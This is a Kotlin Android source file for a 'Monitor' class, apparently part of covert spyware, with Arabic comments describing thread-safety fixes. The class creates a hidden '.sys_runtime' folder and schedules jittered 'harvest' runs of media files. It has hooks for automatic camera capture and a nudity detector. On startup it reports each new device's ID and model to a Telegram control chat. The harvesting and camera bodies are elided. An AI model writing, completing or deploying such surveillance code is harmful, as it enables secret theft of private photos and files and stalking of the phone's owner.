package com.example.app

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import kotlin.random.Random

/**
 * فئة المراقبة الرئيسية.
 * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
 * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
 */
class Monitor private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val harvestMutex = Mutex()

    @Volatile private var isRunning = false
    @Volatile private var isHarvestRunning = false

    var deviceId: String = "DEV_PC"
        private set
    var deviceModel: String = "Android_Device"
        private set

    // ========== المسارات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val configFile: File by lazy { File(runtimeDir, "c.json") }
    private val lastHarvestFile: File by lazy { File(runtimeDir, "lh") }
    private val waitingTimeFile: File by lazy { File(runtimeDir, "wt") }
    private val logFile: File by lazy { File(runtimeDir, "m.log") }

    // ========== المكونات الخارجية ==========
    var ui: Any? = null
    var dailyZipper: Any? = null
    var cameraAnalyzer: Any? = null
    var mediaScanner: Any? = null
    var ctrl: Long? = null
    var vlt: Long? = null
    var nudeDetector: Any? = null

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "hth" to 15,
        "wl" to false,
        "iv" to 900L,
        "harvest_min_interval" to 7200L,
        "harvest_random_hours_min" to 2,
        "harvest_random_hours_max" to 6,
        "harvest_jitter_minutes" to 7,
        "harvest_jitter_max_minutes" to 53,
        "auto_camera" to false,
        "camera_interval" to 3600L,
        "camera_jitter" to 600L,
        "max_harvest_files" to 200,
        "force_harvest_on_start" to false,
        "scan_on_start" to true,
        "min_wifi_strength" to -80,
        "enable_auto_harvest" to true
    )

    // ✅ استخدام ConcurrentHashMap
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "Monitor"

        @Volatile
        private var instance: Monitor? = null

        fun getInstance(context: Context): Monitor {
            return instance ?: synchronized(this) {
                instance ?: Monitor(context).also { instance = it }
            }
        }

        fun getDeviceTag(context: Context): String {
            return try {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                if (!androidId.isNullOrEmpty()) androidId.take(8).lowercase(Locale.ROOT)
                else {
                    val model = "${Build.MANUFACTURER} ${Build.MODEL}"
                    val md = MessageDigest.getInstance("MD5")
                    md.digest(model.toByteArray()).take(4).joinToString("") { "%02x".format(it) }
                }
            } catch (_: Exception) { "unknown" }
        }
    }

    init {
        setupEnvironment()
        loadConfig()
        fetchDeviceInfo()
        ensureNextHarvestTime()
    }

    // ============================================================
    //  دوال الإعدادات (نفس الكود الأصلي)
    // ============================================================
    private fun setupEnvironment() { /* ... */ }
    private fun loadConfig() { /* ... */ }
    private fun saveConfig() { /* ... */ }
    fun updateConfig(key: String, value: Any): Boolean { /* ... */ return true }
    private fun fetchDeviceInfo() { /* ... */ }
    fun isWifiConnected(): Boolean { /* ... */ return false }
    fun getBatteryStatus(): Pair<Int, Boolean> { /* ... */ return Pair(50, false) }

    // ============================================================
    //  إدارة وقت الحصاد (نفس الكود الأصلي)
    // ============================================================
    private fun parseIsoDateTime(isoStr: String?): Date? { /* ... */ return null }
    private fun formatIsoDateTime(date: Date): String { /* ... */ return "" }
    private fun setNextHarvestTime(hoursOverride: Int? = null): Date? { /* ... */ return null }
    private fun ensureNextHarvestTime(): Boolean { /* ... */ return true }
    private fun updateLastHarvestTime() { /* ... */ }
    private fun canHarvest(force: Boolean): Pair<Boolean, String> { /* ... */ return Pair(true, "OK") }
    fun getNextHarvestTime(): Date? { /* ... */ return null }

    // ============================================================
    //  منطق الحصاد والكاميرا (نفس الكود الأصلي)
    // ============================================================
    private suspend fun harvestLogic(force: Boolean = false) { /* ... */ }
    private suspend fun cameraLogic() { /* ... */ }

    // ============================================================
    //  دورة الحياة
    // ============================================================
    fun start() {
        if (isRunning) return
        isRunning = true
        scope.launch {
            val scanOnStart = configMap["scan_on_start"] as? Boolean ?: true
            if (scanOnStart && mediaScanner != null) {
                try { invokeMethod(mediaScanner, "runScan", true) } catch (e: Exception) { writeLog("Initial scan error: ${e.message}") }
            }
            ui?.let { uiObj ->
                try {
                    invokeMethod(uiObj, "registerDevice", deviceId, deviceModel)
                } catch (_: Exception) {
                    try {
                        invokeMethod(uiObj, "_api", "sendMessage", mapOf(
                            "chat_id" to ctrl,
                            "text" to "📱 جهاز جديد متصل\nID: `$deviceId`\nModel: $deviceModel",
                            "parse_mode" to "Markdown"
                        ))
                    } catch (_: Exception) {}
                }
            }
            val forceStart = configMap["force_harvest_on_start"] as? Boolean ?: false
            if (forceStart) { writeLog("Starting forced harvest on startup"); forceHarvest() }
            while (isRunning && isActive) {
                try { harvestLogic(force = false); cameraLogic() } catch (e: Exception) { writeLog("Monitor loop error: ${e.message}") }
                val interval = (configMap["iv"] as? Number)?.toLong() ?: 900L
                delay(interval * 1000L)
            }
        }
    }

    fun stop() { isRunning = false; scope.cancel() }
    fun forceHarvest() { /* ... */ }
    fun resetHarvestTimer() { /* ... */ }
    fun isHarvesting(): Boolean = isHarvestRunning
    fun getStatus(): Map<String, Any?> { /* ... */ return emptyMap() }

    // ============================================================
    //  دوال المساعدة (تم إصلاح methodCache و invokeMethod)
    // ============================================================
    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    /**
     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
